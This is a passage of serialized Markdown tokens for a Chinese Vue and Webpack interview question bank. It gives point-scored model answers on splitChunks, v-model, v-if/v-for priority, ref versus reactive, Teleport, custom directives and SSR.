代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码压缩和混淆（Webpack 相关）","text":" 代码压缩和混淆（Webpack 相关）","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。","text":"\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"}]}]},{"type":"list_item","raw":"* **1：** 合理设置chunk大小和数量（Webpack 相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","task":false,"loose":false,"text":"**1：** 合理设置chunk大小和数量（Webpack 相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","tokens":[{"type":"text","raw":"**1：** 合理设置chunk大小和数量（Webpack 相关）<br/>\\n\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","text":"**1：** 合理设置chunk大小和数量（Webpack 相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理设置chunk大小和数量（Webpack 相关）","text":" 合理设置chunk大小和数量（Webpack 相关）","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。","text":"\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","text":"\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nmodule.exports = {\\n  optimization: {\\n    splitChunks: {\\n      chunks: \'all\',\\n      minSize: 30000,\\n      maxSize: 0,\\n      minChunks: 1,\\n      maxAsyncRequests: 5,\\n      maxInitialRequests: 3,\\n      automaticNamePrefix: \'chunk - \',\\n      cacheGroups: {\\n        vendors: {\\n          test: /[\\\\\\\\/]node_modules[\\\\\\\\/]/,\\n          priority: - 10\\n        },\\n        default: {\\n          minChunks: 2,\\n          priority: - 20,\\n          reuseExistingChunk: true\\n        }\\n      }\\n    }\\n  }\\n};\\n```","lang":"js","text":"module.exports = {\\n  optimization: {\\n    splitChunks: {\\n      chunks: \'all\',\\n      minSize: 30000,\\n      maxSize: 0,\\n      minChunks: 1,\\n      maxAsyncRequests: 5,\\n      maxInitialRequests: 3,\\n      automaticNamePrefix: \'chunk - \',\\n      cacheGroups: {\\n        vendors: {\\n          test: /[\\\\\\\\/]node_modules[\\\\\\\\/]/,\\n          priority: - 10\\n        },\\n        default: {\\n          minChunks: 2,\\n          priority: - 20,\\n          reuseExistingChunk: true\\n        }\\n      }\\n    }\\n  }\\n};"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## v-model 双向绑定的原理是什么？\\n\\n","depth":2,"text":"v-model 双向绑定的原理是什么？","tokens":[{"type":"text","raw":"v-model 双向绑定的原理是什么？","text":"v-model 双向绑定的原理是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","task":false,"loose":false,"text":"**1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","tokens":[{"type":"text","raw":"**1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","text":"**1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","text":" v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 在  v-if 和 v-for 的优先级哪个高？\\n\\n","depth":2,"text":"在  v-if 和 v-for 的优先级哪个高？","tokens":[{"type":"text","raw":"在  v-if 和 v-for 的优先级哪个高？","text":"在  v-if 和 v-for 的优先级哪个高？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","task":false,"loose":false,"text":"**1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","tokens":[{"type":"text","raw":"**1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","text":"**1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","text":" 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## ref与reactive的区别？\\n\\n","depth":2,"text":"ref与reactive的区别？","tokens":[{"type":"text","raw":"ref与reactive的区别？","text":"ref与reactive的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6分）\\n\\n","depth":4,"text":"解答（6分）","tokens":[{"type":"text","raw":"解答（6分）","text":"解答（6分）","escaped":false}]},{"type":"list","raw":"* **1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。\\n* **1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。\\n* **1：** ref 函数可以接收原始数据类型与引用数据类型。\\n* **1：** reactive 函数只能接收引用数据类型。\\n* **1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。\\n* **1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。\\n","task":false,"loose":false,"text":"**1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","tokens":[{"type":"text","raw":"**1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","text":"**1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","text":" ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。\\n","task":false,"loose":false,"text":"**1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","tokens":[{"type":"text","raw":"**1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","text":"**1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","text":" ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** ref 函数可以接收原始数据类型与引用数据类型。\\n","task":false,"loose":false,"text":"**1：** ref 函数可以接收原始数据类型与引用数据类型。","tokens":[{"type":"text","raw":"**1：** ref 函数可以接收原始数据类型与引用数据类型。","text":"**1：** ref 函数可以接收原始数据类型与引用数据类型。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ref 函数可以接收原始数据类型与引用数据类型。","text":" ref 函数可以接收原始数据类型与引用数据类型。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** reactive 函数只能接收引用数据类型。\\n","task":false,"loose":false,"text":"**1：** reactive 函数只能接收引用数据类型。","tokens":[{"type":"text","raw":"**1：** reactive 函数只能接收引用数据类型。","text":"**1：** reactive 函数只能接收引用数据类型。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" reactive 函数只能接收引用数据类型。","text":" reactive 函数只能接收引用数据类型。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。\\n","task":false,"loose":false,"text":"**1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","tokens":[{"type":"text","raw":"**1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","text":"**1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","text":" ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","task":false,"loose":false,"text":"**1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","tokens":[{"type":"text","raw":"**1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","text":"**1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","text":" 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vue 3 中的Teleport功能有什么作用，如何使用？\\n\\n","depth":2,"text":"Vue 3 中的Teleport功能有什么作用，如何使用？","tokens":[{"type":"text","raw":"Vue 3 中的Teleport功能有什么作用，如何使用？","text":"Vue 3 中的Teleport功能有什么作用，如何使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* **2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","task":false,"loose":false,"text":"**2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","tokens":[{"type":"text","raw":"**2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n\\n指定to属性为目标 DOM 元素的选择器或id。例如:","text":"**2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 ","text":" Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 ","escaped":false},{"type":"codespan","raw":"`<teleport>`","text":"<teleport>"},{"type":"text","raw":" 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","text":" 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n<teleport to=\\"#app-root\\">...</teleport>\\n//会将包裹的元素移动到id为app-root的元素内部。\\n```","lang":"js","text":"<teleport to=\\"#app-root\\">...</teleport>\\n//会将包裹的元素移动到id为app-root的元素内部。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何在 Vue 3 中实现自定义指令的全局注册和局部注册？\\n\\n","depth":2,"text":"如何在 Vue 3 中实现自定义指令的全局注册和局部注册？","tokens":[{"type":"text","raw":"如何在 Vue 3 中实现自定义指令的全局注册和局部注册？","text":"如何在 Vue 3 中实现自定义指令的全局注册和局部注册？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","task":false,"loose":false,"text":"**1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","tokens":[{"type":"text","raw":"**1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","text":"**1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","text":" 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 说一下 Vue SSR 的实现原理\\n\\n","depth":2,"text":"说一下 Vue SSR 的实现原理","tokens":[{"type":"text","raw":"说一下 Vue SSR 的实现原理","text":"说一下 Vue SSR 的实现原理","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。\\n\\n* SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。\\n\\n","task":false,"loose":true,"text":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。\\n","tokens":[{"type":"text","raw":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。\\n","text":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。","tokens":[{"type":"text","raw":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。","text":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。","escaped":false}]}]},{"type":"list_item","raw":"* SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","task":false,"loose":true,"text":"SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","tokens":[{"type":"text","raw":"SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","text":"SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","tokens":[{"type":"text","raw":"SSR有着更好